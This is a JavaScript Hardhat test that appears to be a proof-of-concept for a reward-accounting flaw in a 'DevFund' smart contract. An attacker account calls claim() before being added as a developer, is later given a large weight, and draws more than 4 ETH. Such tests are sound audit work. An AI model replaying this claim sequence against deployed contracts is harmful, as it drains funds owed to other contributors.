it("Attacker calls DevFund.claim without contributing", async function () {

      // Initial setup
      await devFund.addDev(user1.address, 50);
      await devFund.addDev(user2.address, 50);
  

      // Fund the DevFund
      await owner.sendTransaction({
        to: await devFund.getAddress(),
        value: ethers.parseEther("10.0"),
      });

      

      // Attacker calls claim before being added as a dev
      await devFund.connect(user3).claim();

      // Add attacker as a dev with high weight
      await devFund.addDev(user3.address, 10000000);
  

      // More funds added to DevFund
      await owner.sendTransaction({
        to: await devFund.getAddress(),
        value: ethers.parseEther("15.0"),
      });


  
      // Attacker claims again

      console.log(ethers.formatEther(await ethers.provider.getBalance(user1.address)))
      console.log(ethers.formatEther(await ethers.provider.getBalance(user2.address)))
      console.log(ethers.formatEther(await ethers.provider.getBalance(user3.address)))
      const balanceBefore = await ethers.provider.getBalance(user3.address);
      await devFund.connect(user3).claim();
      await devFund.connect(user1).claim();

      await devFund.connect(user2).claim();
      
      const balanceAfter = await ethers.provider.getBalance(user3.address);
  
      // Check attacker's profit
      const profit = balanceAfter - (balanceBefore);
      console.log("Attacker's profit:", ethers.formatEther(profit));

      console.log(ethers.formatEther(await ethers.provider.getBalance(user1.address)))
      console.log(ethers.formatEther(await ethers.provider.getBalance(user2.address)))
      console.log(ethers.formatEther(await ethers.provider.getBalance(user3.address)))
  
      // Verify attacker gained significant funds
      expect(profit).to.be.gt(ethers.parseEther("4.0"));
    });
